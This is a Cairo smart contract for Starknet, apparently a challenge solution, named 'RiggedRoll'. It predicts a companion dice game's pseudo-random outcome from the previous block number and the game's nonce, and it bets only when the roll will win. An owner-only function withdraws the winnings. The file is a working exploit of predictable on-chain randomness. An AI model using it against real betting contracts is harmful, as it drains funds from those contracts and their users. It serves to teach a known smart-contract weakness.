use starknet::ContractAddress;

#[starknet::interface]
pub trait IRiggedRoll<T> {
    fn rigged_roll(ref self: T, amount: u256);
    fn withdraw(ref self: T, to: ContractAddress, amount: u256);
    fn last_dice_value(self: @T) -> u256;
    fn predicted_roll(self: @T) -> u256;
    fn dice_game(self: @T) -> ContractAddress;
}

#[starknet::contract]
mod RiggedRoll {
    use contracts::DiceGame::IDiceGameDispatcher;
    use contracts::DiceGame::IDiceGameDispatcherTrait;
    use keccak::keccak_u256s_le_inputs;
    use openzeppelin::access::ownable::OwnableComponent;
    use openzeppelin::token::erc20::interface::IERC20CamelDispatcherTrait;
    use starknet::{ContractAddress, get_contract_address, get_block_number, get_caller_address};
    use super::IRiggedRoll;

    component!(path: OwnableComponent, storage: ownable, event: OwnableEvent);

    #[abi(embed_v0)]
    impl OwnableImpl = OwnableComponent::OwnableImpl<ContractState>;

    impl OwnableInternalImpl = OwnableComponent::InternalImpl<ContractState>;

    #[storage]
    struct Storage {
        dice_game: IDiceGameDispatcher,
        #[substorage(v0)]
        ownable: OwnableComponent::Storage,
        predicted_roll: u256
    }

    #[event]
    #[derive(Drop, starknet::Event)]
    enum Event {
        #[flat]
        OwnableEvent: OwnableComponent::Event
    }

    #[constructor]
    fn constructor(
        ref self: ContractState, dice_game_address: ContractAddress, owner: ContractAddress
    ) {
        self.dice_game.write(IDiceGameDispatcher { contract_address: dice_game_address });
        self.ownable.initializer(owner);
    }

    #[abi(embed_v0)]
    impl RiggedRollImpl of super::IRiggedRoll<ContractState> {
        fn rigged_roll(ref self: ContractState, amount: u256) {
            // call approve on UI
            self
                .dice_game
                .read()
                .eth_token()
                .transferFrom(get_caller_address(), get_contract_address(), amount);

            let contract_balance = self
                .dice_game
                .read()
                .eth_token()
                .balanceOf(get_contract_address());
            assert(contract_balance >= 2000000000000000, 'Not enough ETH');

            let prev_block: u256 = get_block_number().into() - 1;
            let array = array![prev_block, self.dice_game.read().nonce()];
            let predicted_roll = keccak_u256s_le_inputs(array.span()) % 16;
            self.predicted_roll.write(predicted_roll);
            let predicted_roll = self.predicted_roll.read();

            if (predicted_roll <= 5) {
                self
                    .dice_game
                    .read()
                    .eth_token()
                    .approve(self.dice_game.read().contract_address, amount);
                self.dice_game.read().roll_dice(amount);
            } else {
                self.dice_game.read().eth_token().transfer(get_caller_address(), amount);
            // assert(false, 'Greater than 5');
            }
        }
        fn withdraw(ref self: ContractState, to: ContractAddress, amount: u256) {
            self.ownable.assert_only_owner();
            let contract_balance = self
                .dice_game
                .read()
                .eth_token()
                .balanceOf(get_contract_address());
            assert(contract_balance >= amount, 'Insufficient balance');
            self.dice_game.read().eth_token().transfer(to, amount);
        }
        fn last_dice_value(self: @ContractState) -> u256 {
            self.dice_game.read().last_dice_value()
        }
        fn predicted_roll(self: @ContractState) -> u256 {
            self.predicted_roll.read()
        }
        fn dice_game(self: @ContractState) -> ContractAddress {
            self.dice_game.read().contract_address
        }
    }
}
